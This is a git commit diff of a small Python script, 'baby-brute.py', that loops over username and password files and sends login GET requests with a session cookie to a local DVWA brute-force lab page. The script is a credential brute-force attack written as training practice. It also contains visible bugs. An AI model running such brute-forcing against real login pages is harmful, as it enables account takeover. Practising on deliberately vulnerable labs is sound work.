5c432532649590b5120a71f7eeb53692195022d9
Nicholas Tapia <tapzx2@Nicholass-MacBook-Air.local>
2022-03-01 10:16:13 -0500

    add urllib3

--- baby-brute.py
+++ baby-brute.py
@@ -1,26 +1,36 @@
 import argparse
-import urllib3
+import urllib3 # https://urllib3.readthedocs.io/en/latest/user-guide.html
+http = urllib3.PoolManager()
 
+# handle command line input arguments
 parser = argparse.ArgumentParser()
 parser.add_argument('users', type=str, help="this is the username file")
 parser.add_argument('passwords', type=str, help="this is the passwords file")
 parser.add_argument('phpsessid', type=str, help="this is the passwords file")
-
 args = parser.parse_args()
 
-file = open(f"{args.users}", "r")
-names = file.read().split("\n")
-file.close
-file = open(f"{args.passwords}", "r")
-creds = file.read().split("\n")
-file.close
+# load user name and password files
+with open(args.users, "r") as f:
+    names = f.read().split("\n")
+
+with open(args.passwords, "r") as f:
+    creds = f.read().split("\n")
+
 
 for name in names:
     for cred in creds:
         print (name+':'+cred)
-        url = f'http://192.168.0.2/dvwa/vulnerabilities/brute/index.php?username={name}&password={cred}&Login=Login'
-        get = urllib3.Request(url)
-        get.add_header(f'Cookie", "security=low; PHPSESSID={args.phpsessid}')
-        resp = urllib3.urlopen(get)
-        html = resp.read()
-        # write responses to file # inverse grep for flexibility
+        try:
+            resp = http.request(
+                "GET",
+                f'http://127.0.0.1/dvwa/vulnerabilities/brute/index.php?username={name}&password={cred}&Login=Login',
+                retrys=False,
+                headers={
+                    "Cookie": f"security=low; PHPSESSID={args.phpsessid}"
+                }
+            )
+            print(resp.read())
+            with open("responses.txt", "a") as f:
+                f.write(resp.read())
+        except:
+            print('exception')      
